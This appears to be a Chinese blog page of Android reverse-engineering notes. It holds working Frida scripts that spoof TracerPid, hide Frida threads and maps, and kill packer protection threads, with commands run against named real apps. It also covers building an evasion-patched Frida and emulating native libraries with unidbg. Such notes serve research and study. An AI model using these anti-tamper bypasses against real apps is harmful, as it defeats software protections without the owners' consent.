<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">bypass_fgets</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> fgetsPtr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fgets&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> fgets = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fgetsPtr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(fgetsPtr,fgets);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(fgetsPtr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">buffer, size, fp</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> retval = <span class="title function_">fgets</span>(buffer, size, fp);</span><br><span class="line">        <span class="keyword">var</span> bufstr = buffer.<span class="title function_">readCString</span>();</span><br><span class="line">        <span class="keyword">if</span> (bufstr.<span class="title function_">indexOf</span>(<span class="string">&quot;TracerPid:&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Memory</span>.<span class="title function_">writeUtf8String</span>(buffer, <span class="string">&quot;TracerPid:\t0&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bufstr.<span class="title function_">indexOf</span>(<span class="string">&quot;Name:\tgmain&quot;</span>) &gt; -<span class="number">1</span> || bufstr.<span class="title function_">indexOf</span>(<span class="string">&quot;Name:\tgdbus&quot;</span>) &gt; -<span class="number">1</span> || bufstr.<span class="title function_">indexOf</span>(<span class="string">&quot;Name:\tpool-frida&quot;</span>) &gt; -<span class="number">1</span> || bufstr.<span class="title function_">indexOf</span>(<span class="string">&quot;Name:\tgum-js-loop&quot;</span>) &gt; -<span class="number">1</span> || bufstr.<span class="title function_">indexOf</span>(<span class="string">&quot;SigBlk:\tffffffe0fffbfaff&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Memory</span>.<span class="title function_">writeUtf8String</span>(buffer, <span class="string">&quot;TName:\t1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_fopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> open_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> io_map = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/proc/13585/maps&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(open_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (args[<span class="number">0</span>].<span class="title function_">readCString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;/maps&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                args[<span class="number">0</span>] = io_map</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">pathname</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">mode</span> = args[<span class="number">1</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fopen pathname=&quot;</span> + <span class="variable language_">this</span>.<span class="property">pathname</span>.<span class="title function_">readCString</span>() + <span class="string">&quot;---mode=&quot;</span> + <span class="variable language_">this</span>.<span class="property">mode</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_readlink</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> aaa, bbb, ccc;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;readlink&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            aaa = args[<span class="number">0</span>];</span><br><span class="line">            bbb = args[<span class="number">1</span>];</span><br><span class="line">            ccc = args[<span class="number">2</span>];</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="comment">// console.log(&#x27;\nreadlink(&#x27; + &#x27;s1=&quot;&#x27; + aaa.readCString() + &#x27;&quot;&#x27; + &#x27;, s2=&quot;&#x27; + bbb.readCString() + &#x27;&quot;&#x27; + &#x27;, s3=&quot;&#x27; + ccc + &#x27;&quot;&#x27; + &#x27;)&#x27;);</span></span><br><span class="line">            <span class="keyword">if</span> (bbb.<span class="title function_">readCString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;frida&quot;</span>) !== -<span class="number">1</span> ||</span><br><span class="line">                bbb.<span class="title function_">readCString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;gum-js-loop&quot;</span>) !== -<span class="number">1</span> ||</span><br><span class="line">                bbb.<span class="title function_">readCString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;gmain&quot;</span>) !== -<span class="number">1</span> ||</span><br><span class="line">                bbb.<span class="title function_">readCString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;tmp&quot;</span>) !== -<span class="number">1</span> ||</span><br><span class="line">                bbb.<span class="title function_">readCString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;linjector&quot;</span>) !== -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\nreadlink(&#x27;</span> + <span class="string">&#x27;s1=&quot;&#x27;</span> + aaa.<span class="title function_">readCString</span>() + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&#x27;, s2=&quot;&#x27;</span> + bbb.<span class="title function_">readCString</span>() + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&#x27;, s3=&quot;&#x27;</span> + ccc + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">                bbb.<span class="title function_">writeUtf8String</span>(<span class="string">&quot;/system/framework/boot.art&quot;</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;replce with: &quot;</span>+bbb.<span class="title function_">readCString</span>())</span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">0x1A</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">bypass_fgets</span>()</span><br><span class="line">    <span class="title function_">hook_fopen</span>()</span><br><span class="line">    <span class="title function_">hook_readlink</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// hook_anti-thread.js</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">hook_pthread_create</span></span>() &#123;</span><br><span class="line">    var pthread_create_addr = Module.findExportByName(null, <span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    const __android_log_print_ptr = Module.findExportByName(null, <span class="string">&#x27;__android_log_print&#x27;</span>)</span><br><span class="line">    const cm = new CModule(`</span><br><span class="line">    <span class="comment">#include &lt;gum/guminterceptor.h&gt;</span></span><br><span class="line">    extern void onMessageStr (const gchar * message);</span><br><span class="line">    extern void onMessagePtr (void * message);</span><br><span class="line">    extern void onMessageInt (int a);</span><br><span class="line">    extern int __android_log_print(int prio, const char* tag, const char* <span class="built_in">fmt</span>, ...);</span><br><span class="line">    void <span class="function"><span class="title">hello</span></span>()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    void onEnter (GumInvocationContext * ic)</span><br><span class="line">      &#123;</span><br><span class="line">        // void* arg2,arg3;</span><br><span class="line">        <span class="keyword">if</span>((((int)gum_invocation_context_get_nth_argument(ic, 2))&amp;0xfff)==0x599)&#123;</span><br><span class="line">            onMessageStr(<span class="string">&quot;replace success&quot;</span>);</span><br><span class="line">            gum_invocation_context_replace_nth_argument(ic,2,(gpointer)hello);</span><br><span class="line">        &#125;</span><br><span class="line">        // arg2 = gum_invocation_context_get_nth_argument (ic, 2);</span><br><span class="line">        onMessagePtr(gum_invocation_context_get_nth_argument (ic, 2));</span><br><span class="line">        // arg0 = (int)gum_invocation_context_get_nth_argument (ic, 2);</span><br><span class="line">        // gum_invocation_context_replace_nth_argument(ic,2,(gpointer)100);</span><br><span class="line">        // arg1 = (int)gum_invocation_context_get_nth_argument (ic, 3);</span><br><span class="line">        // <span class="built_in">log</span> (<span class="string">&quot;function add arg0=%d arg1=%d &quot;</span>, arg0,arg1);</span><br><span class="line">        // __android_log_print(3,<span class="string">&quot;isDebug&quot;</span>,<span class="string">&quot;arg0=%d,arg1=%d&quot;</span>,arg0,arg1);</span><br><span class="line">      &#125;</span><br><span class="line">      void</span><br><span class="line">      onLeave (GumInvocationContext * ic)</span><br><span class="line">      &#123;</span><br><span class="line">        int result;</span><br><span class="line">        result = (int) gum_invocation_context_get_return_value (ic);</span><br><span class="line">        onMessageInt(result);</span><br><span class="line">        // gum_invocation_context_replace_return_value (ic,(gpointer)100);</span><br><span class="line">      &#125;`, &#123;</span><br><span class="line">        __android_log_print: __android_log_print_ptr,</span><br><span class="line">        onMessageStr: new NativeCallback(messagePtr =&gt; &#123;</span><br><span class="line">            const message = messagePtr.readUtf8String();</span><br><span class="line">            console.log(<span class="string">&#x27;onMessageStr:&#x27;</span>, message);</span><br><span class="line">        &#125;, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]),</span><br><span class="line">        onMessagePtr: new NativeCallback(messagePtr =&gt; &#123;</span><br><span class="line">            console.log(<span class="string">&#x27;onMessagePtr:&#x27;</span>, messagePtr ,hexdump(messagePtr));</span><br><span class="line">        &#125;, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]),</span><br><span class="line">        onMessageInt: new NativeCallback(messageInt =&gt; &#123;</span><br><span class="line">            console.log(<span class="string">&#x27;onMessageInt:&#x27;</span>, messageInt);</span><br><span class="line">        &#125;, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>]),</span><br><span class="line">    &#125;);</span><br><span class="line">    Interceptor.attach(pthread_create_addr, cm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">replace_thread</span></span>() &#123;</span><br><span class="line">    var pthread_create_addr = Module.findExportByName(null, <span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    var pthread_create = new NativeFunction(pthread_create_addr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    Interceptor.replace(pthread_create_addr, new NativeCallback((parg0, parg1, parg2, parg3) =&gt; &#123;</span><br><span class="line">        var so_name = Process.findModuleByAddress(parg2).name;</span><br><span class="line">        var so_base = Module.getBaseAddress(so_name);</span><br><span class="line">        var offset = (parg2 - so_base);</span><br><span class="line">        var PC = 0;</span><br><span class="line">        console.log(<span class="string">&quot;normal find thread func offset&quot;</span>, so_name, parg2,offset, offset.toString(16));</span><br><span class="line">        // i加密 guilvyouping  梆梆 budayuepao  360 leisu</span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">        (so_name.indexOf(<span class="string">&quot;libexec.so&quot;</span>)&gt;-1 &amp;&amp; offset===197069)||</span><br><span class="line">        (so_name.indexOf(<span class="string">&quot;libexec.so&quot;</span>)&gt;-1 &amp;&amp; offset===196137)</span><br><span class="line">        )&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>((so_name.indexOf(<span class="string">&quot;libDexHelper.so&quot;</span>)&gt;-1 &amp;&amp; offset===684452)||</span><br><span class="line">        (so_name.indexOf(<span class="string">&quot;libDexHelper.so&quot;</span>)&gt;-1 &amp;&amp; offset===724380))&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            PC = pthread_create(parg0, parg1, parg2, parg3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> PC;</span><br><span class="line">    &#125;, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(replace_thread)</span><br><span class="line"></span><br><span class="line">// frida -U -f com.darvin.security -l hook_anti-thread.js --no-pause -o out.log</span><br><span class="line">// frida -UF -l hook_anti-thread.js</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//frida -U -f com.gzlex.hui.guoziwei.travel --no-pause -l hook_anti-thread.js </span><br><span class="line">//frida -U -f tv.danmaku.bili -l hook_anti-thread.js  --no-pause  </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>1、hook app调用的各关键内置函数的调用 so和偏移值</p>
<p>2、针对每次调用进行功能hook，多个进行hook，筛选关键功能</p>
<p>打快照为什么要关机</p>
<h1 id="自编译Frida"><a href="#自编译Frida" class="headerlink" title="自编译Frida"></a>自编译Frida</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装全新ubuntu</span><br><span class="line">sudo apt-get install proxychains</span><br><span class="line">sudo gedit /etc/proxychains.conf</span><br><span class="line">	socks5 ip port</span><br><span class="line">sudo apt-get install curl</span><br><span class="line">proxychains curl www.httpbin.org/ip  // 验证代理IP</span><br><span class="line">sudo apt install git</span><br><span class="line">sudo dpkg -i vscode.deb</span><br><span class="line">	code .</span><br><span class="line">proxychains sudo apt-get install build-essential curl git lib32stdc++-9-dev libc6-dev-i386 nodejs npm python3-dev python3-pip  <span class="comment"># 此处默认是安装最新的nodejs，frida和nodejs有一定的对应关系</span></span><br><span class="line">proxychains git <span class="built_in">clone</span> -b 16.2.1 --recurse-submodules https://github.com/frida/frida</span><br><span class="line"><span class="built_in">cd</span> frida</span><br><span class="line">sudo apt install m4</span><br><span class="line"><span class="comment"># 此处似乎就是报错</span></span><br><span class="line">proxychains make -f Makefile.toolchain.mk</span><br><span class="line"><span class="comment"># 手动下载需要的sdk版本，查看frida对应的版本</span></span><br><span class="line"><span class="built_in">cd</span> releng</span><br><span class="line"><span class="built_in">cat</span> deps.mk | <span class="built_in">head</span> -n 10 <span class="comment">#查看deps.mk的前10行，版本是 20240123</span></span><br><span class="line"><span class="comment"># 下载sdk，frida目录下载到/build</span></span><br><span class="line">sudo wget https://build.frida.re/deps/20240123/toolchain-linux-x86_64.tar.bz2</span><br><span class="line">sudo wget https://build.frida.re/deps/20240123/sdk-linux-x86_64.tar.bz2</span><br><span class="line">sudo wget https://build.frida.re/deps/20240123/sdk-android-arm64.tar.bz2</span><br><span class="line"><span class="comment"># /frida目录下执行</span></span><br><span class="line">./releng/setup-env.sh</span><br><span class="line"><span class="comment"># 手动下载需要的ndk版本，查看frida对应的版本，可随意下载目录，环境变量指定路径</span></span><br><span class="line"><span class="built_in">cd</span> releng</span><br><span class="line"><span class="built_in">cat</span> setup-env.sh | grep ndk</span><br><span class="line"><span class="comment"># 下载ndk官网地址：https://developer.android.com/ndk/downloads，具体名字看官网</span></span><br><span class="line">proxychains wget https://dl.google.com/android/repository/android-ndk-r22b-linux-x86_64.zip</span><br><span class="line">unzip xxx</span><br><span class="line"><span class="comment"># 配置ndk路径</span></span><br><span class="line">sudo gedit ~/.bashrc</span><br><span class="line"><span class="built_in">export</span> ANDROID_NDK_ROOT=/XXX/XXX/android-ndk-r24</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$ANDROID_NDK_ROOT</span>:<span class="variable">$PATH</span></span><br><span class="line">ndk-build -v</span><br><span class="line"><span class="comment"># 下载对应版本的Node和npm，在github release有code的版本</span></span><br><span class="line">https://blog.csdn.net/John_Lenon/article/details/136155942?spm=1001.2014.3001.5506</span><br><span class="line"><span class="comment">#编译</span></span><br><span class="line">make core-android-arm64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再把手动下载的sdk放进去覆盖</span></span><br><span class="line">make clean</span><br><span class="line"><span class="built_in">rm</span> -rf build/</span><br><span class="line">frida/build/tmp-android-arm64/frida-core/server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意注意：执行make clean时候会把自建的python文件删除</span><br></pre></td></tr></table></figure>

<h1 id="魔改Frida"><a href="#魔改Frida" class="headerlink" title="魔改Frida"></a>魔改Frida</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/hluwa/Patchs/tree/master/strongR-frida/frida-core</span><br><span class="line"></span><br><span class="line">根据gmain修改gdbus</span><br><span class="line">替换所有/data/local/tmp</span><br></pre></td></tr></table></figure>



<h1 id="ubuntu使用-v2"><a href="#ubuntu使用-v2" class="headerlink" title="ubuntu使用 v2"></a>ubuntu使用 v2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libfuse2</span><br><span class="line">wget https://github.com/v2ray/v2ray-core/releases/download/v4.27.0/v2ray-linux-64.zip</span><br><span class="line">wget https://github.com/Qv2ray/Qv2ray/releases/download/v2.6.3/Qv2ray.v2.6.3.linux-x64.AppImage</span><br><span class="line">unzip v2ray-linux-64.zip</span><br><span class="line">chmod +x Qv2ray.v2.6.3.linux-x64.AppImage</span><br><span class="line">./Qv2ray.v2.6.3.linux-x64.AppImage</span><br><span class="line"># 修改内核设置/可执行文件路径/资源目录</span><br><span class="line"></span><br><span class="line">hiddify</span><br></pre></td></tr></table></figure>





<h1 id="unidbg-模拟执行-SO"><a href="#unidbg-模拟执行-SO" class="headerlink" title="unidbg 模拟执行 SO"></a>unidbg 模拟执行 SO</h1><p>用起来啊，不然学个der</p>
<ul>
<li>框架本身开启打印日志，就能打印出RegisterNatives的方法，找到动态注册的方法，通过IDA跳转过去，hook_RegisterNative.js</li>
<li>jadx中tab键切换smail代码</li>
<li>java项目，直接导入idea</li>
<li>frida代码.$className 可查看类对象</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、AndroidEmulatorBuilder 指定包名初始化、指定SDK</span><br><span class="line">	sdk19 -&gt; Android 4(32位)</span><br><span class="line">	sdk23 -&gt; Android 6(64位)</span><br><span class="line">2、创建虚拟机，指定APK</span><br><span class="line">3、设定日志打印</span><br><span class="line">4、指定loadLibrary，不然要加载的so文件名字为libhookdemo.so，只需要写hookdemo</span><br><span class="line">5、根据包路径实例化类、初始化类</span><br><span class="line">6、方法调用，指定方法声明&amp;参数</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">androidEmulator = AndroidEmulatorBuilder</span><br><span class="line">                .for64Bit()</span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">Unicorn2Factory</span>(<span class="literal">true</span>))</span><br><span class="line">                .setProcessName(<span class="string">&quot;com.example.xx&quot;</span>)</span><br><span class="line">                <span class="comment">//创建根目录，这里是根目录是用项目目录模拟手机的/data目录</span></span><br><span class="line">                .setRootDir(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;target/rootfs&quot;</span>))</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">memory = androidEmulator.getMemory();</span><br><span class="line">memory.setLibraryResolver(<span class="keyword">new</span> <span class="title class_">AndroidResolver</span>(<span class="number">23</span>));</span><br><span class="line">dalvikVM= androidEmulator.createDalvikVM(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/fuck/xx.apk&quot;</span>));</span><br><span class="line">dalvikVM.setJni(<span class="built_in">this</span>);</span><br><span class="line">dalvikVM.setVerbose(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 去掉前后留存的中间的名字 libtestdemo.so</span></span><br><span class="line">dalvikModule = dalvikVM.loadLibrary(<span class="string">&quot;test&quot;</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="keyword">module</span> = dalvikModule.getModule();</span><br><span class="line"><span class="comment">// 转化为16进制才是IDA看的地址，默认前面会加上unidbg的字符</span></span><br><span class="line">System.out.println(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;Java_com_example_hookdemo_MainActivity_tesucanshu_1jni&quot;</span>).getAddress());</span><br><span class="line">dalvikModule.callJNI_OnLoad(androidEmulator);</span><br></pre></td></tr></table></figure>

<p>JNI参数类型</p>
<p><a href="https://www.jianshu.com/p/54a0b7ccc35e">https://www.jianshu.com/p/54a0b7ccc35e</a></p>
<h2 id="主动调用-amp-特殊参数"><a href="#主动调用-amp-特殊参数" class="headerlink" title="主动调用&amp;特殊参数"></a>主动调用&amp;特殊参数</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">calltesucanshu_dizhi</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">DvmClass</span> <span class="variable">dvmClass</span> <span class="operator">=</span> dalvikVM.resolveClass(<span class="string">&quot;com.example.xx.MainActivity&quot;</span>);</span><br><span class="line">        DvmObject&lt;?&gt; dvmObject = dvmClass.newObject(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; list3 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list3.add(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        list3.add(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ArrayListObject</span> <span class="variable">arrayListObject</span> <span class="operator">=</span> ArrayListObject.newStringList(dalvikVM,<span class="string">&quot;test1&quot;</span>,<span class="string">&quot;test2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Integer, String&gt; Sites3 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Sites3.put(<span class="number">1</span>, <span class="string">&quot;Google&quot;</span>);</span><br><span class="line">        Sites3.put(<span class="number">2</span>, <span class="string">&quot;Runoob&quot;</span>);</span><br><span class="line">        DvmObject&lt;?&gt; object_Sites3 = ProxyDvmObject.createObject(dalvikVM, Sites3);</span><br><span class="line"></span><br><span class="line">        List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list.add(dalvikVM.getJNIEnv());</span><br><span class="line">        list.add(<span class="number">0</span>);</span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 基本数据类型直接添加，复杂/对象类需要添加到虚拟机</span></span><br><span class="line">        list.add(dalvikVM.addGlobalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(dalvikVM,<span class="string">&quot;11111&quot;</span>)));</span><br><span class="line">        list.add(dalvikVM.addGlobalObject(ProxyDvmObject.createObject(dalvikVM,<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>&#125;)));</span><br><span class="line">        list.add(dalvikVM.addGlobalObject(dalvikVM.resolveClass(<span class="string">&quot;com.example.xx.Person&quot;</span>).newObject(<span class="literal">null</span>)));</span><br><span class="line">        list.add(dalvikVM.addGlobalObject(arrayListObject));</span><br><span class="line">        list.add(dalvikVM.addGlobalObject(object_Sites3));</span><br><span class="line">        list.add(dalvikVM.addGlobalObject(ProxyDvmObject.createObject(dalvikVM,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;nihao&quot;</span>, <span class="string">&quot;shijie&quot;</span>&#125;)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 参考 module/emulateFunction，通过地址调用SO函数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span><span class="keyword">module</span>.callFunction(androidEmulator,<span class="number">0x63BBC</span>,list.toArray()).intValue();</span><br><span class="line">        System.out.println(<span class="string">&quot;111-&gt;&quot;</span>+number);</span><br><span class="line">        System.out.println(dalvikVM.getObject(number));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="JNI补环境"><a href="#JNI补环境" class="headerlink" title="JNI补环境"></a>JNI补环境</h2><p>日志打印模式，src&#x2F;test&#x2F;resources&#x2F;log4j.properties 修改test文件下debug</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testJNI</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AndroidEmulator androidEmulator;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Memory memory;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VM dalvikVM;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DalvikModule dalvikModule;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Module <span class="keyword">module</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testJNI</span><span class="params">()</span> &#123;</span><br><span class="line">        androidEmulator = AndroidEmulatorBuilder</span><br><span class="line">                .for64Bit()</span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">Unicorn2Factory</span>(<span class="literal">true</span>))</span><br><span class="line">                .setProcessName(<span class="string">&quot;com.example.hookdemo&quot;</span>)</span><br><span class="line">                <span class="comment">//创建根目录</span></span><br><span class="line">                .setRootDir(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;target/rootfs&quot;</span>))</span><br><span class="line">                .build();</span><br><span class="line">        memory = androidEmulator.getMemory();</span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> <span class="title class_">AndroidResolver</span>(<span class="number">23</span>));</span><br><span class="line">        dalvikVM = androidEmulator.createDalvikVM(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/lesson/testJNI/app-debug.apk&quot;</span>));</span><br><span class="line">        dalvikVM.setJni(<span class="built_in">this</span>);</span><br><span class="line">        dalvikVM.setVerbose(<span class="literal">true</span>);</span><br><span class="line">        dalvikModule = dalvikVM.loadLibrary(<span class="string">&quot;hookdemo&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">module</span> = dalvikModule.getModule();</span><br><span class="line">        dalvikModule.callJNI_OnLoad(androidEmulator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">testJNI</span> <span class="variable">testJNI</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">testJNI</span>();</span><br><span class="line">        testJNI.callgetHash();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; allocObject(BaseVM vm, DvmClass dvmClass, String signature) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (signature)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;com/example/hookdemo/Person-&gt;allocObject&quot;</span>:&#123;</span><br><span class="line">                <span class="keyword">return</span> dvmClass.newObject(signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.allocObject(vm, dvmClass, signature);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">callgetHash</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">DvmClass</span> <span class="variable">dvmClass</span> <span class="operator">=</span> dalvikVM.resolveClass(<span class="string">&quot;com.example.hookdemo.MainActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// String p5 = getApplicationContext().getpackageCodePath();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">apk_path</span> <span class="operator">=</span> <span class="string">&quot;/data/app/com.example.hookdemo-qmoUcGSJuvbQaByYAxdvOg==/base.apk&quot;</span>;</span><br><span class="line">        <span class="type">DvmObject</span> <span class="variable">dvmObject</span> <span 